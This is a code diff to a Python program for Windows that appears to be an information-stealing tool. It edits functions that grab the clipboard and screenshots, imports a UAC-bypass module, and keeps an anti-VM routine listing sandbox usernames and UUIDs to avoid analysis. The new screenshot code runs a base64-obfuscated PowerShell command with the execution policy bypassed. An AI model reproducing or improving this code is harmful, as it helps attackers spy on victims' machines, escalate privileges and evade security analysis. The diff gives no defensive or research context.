@@ -4,7 +4,6 @@ import io
 import platform
 import re
 import struct
-import time
 import base64
 import threading
 import multiprocessing
@@ -21,16 +20,13 @@ import subprocess
 import random
 import windows
 import windows.crypto
-import windows.security
 import windows.generated_def as gdef
 import string
 import conf.config as config
 from Crypto.Cipher import AES, ChaCha20_Poly1305
-from PIL import ImageGrab
 from contextlib import contextmanager
 from datetime import datetime
 from uac_bypass import *
-from io import BytesIO
 
 multiprocessing.freeze_support()
 
@@ -466,10 +462,13 @@ def get_clipboard():
 def screenshot():
     global ss_success
     syst_ = os.path.join(output, 'System')
+    screenshotoutput = os.path.join(syst_, 'Screenshot.png')
     os.makedirs(syst_, exist_ok=True)
     try:
-        screenshot = ImageGrab.grab().save(f"{os.path.join(syst_, 'Screenshot.png')}")
-        ss_success = 1
+        scrn = subprocess.run(base64.b64decode("cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICJBZGQtVHlwZSAndXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcztwdWJsaWMgY2xhc3MgTntbRGxsSW1wb3J0KFwidXNlcjMyLmRsbFwiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNldFByb2Nlc3NEUElBd2FyZSgpO1tEbGxJbXBvcnQoXCJ1c2VyMzIuZGxsXCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRTeXN0ZW1NZXRyaWNzKGludCBpKTt9JzsgW05dOjpTZXRQcm9jZXNzRFBJQXdhcmUoKXxPdXQtTnVsbDsgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZzsgJHc9W05dOjpHZXRTeXN0ZW1NZXRyaWNzKDApOyAkaD1bTl06OkdldFN5c3RlbU1ldHJpY3MoMSk7ICRibXA9TmV3LU9iamVjdCBEcmF3aW5nLkJpdG1hcCAkdywkaDsgJGc9W0RyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGJtcCk7ICRnLkNvcHlGcm9tU2NyZWVuKDAsMCwwLDAsJGJtcC5TaXplKTsgJGJtcC5TYXZlKCRlbnY6VEVNUCsnXHNjcmVlbnNob3QucG5nJyxbRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0XTo6UG5nKTsgJGcuRGlzcG9zZSgpOyAkYm1wLkRpc3Bvc2UoKSI=").decode('utf-8'), shell=True, capture_output=True)
+        if scrn.returncode == 0:
+            shutil.copy2(os.path.join(os.getenv('temp'), 'Screenshot.png'), screenshotoutput)
+            ss_success = 1
     except:
         ss_success = 0
 
@@ -484,6 +483,7 @@ def anti_vm():
     vm_usernames = ['wdagutilityaccount', 'wdc', 'vboxuser', 'vmwareuser', 'administrator', 'user', 'test', 'guest', 'server', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm']
     sandboxuuids = [
         '1D1FB0BB-21B9-4FC0-B017-A4DADA231E17',
+        'FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF',
         '20DC9FCF-04F2-46DB-866A-8B094D51E731',
         '4E29518F-71BD-4AD3-AEAA-B9B737A21F6F',
         'CF39B3BF-A04E-44F3-80E5-56A5937FA2A9',
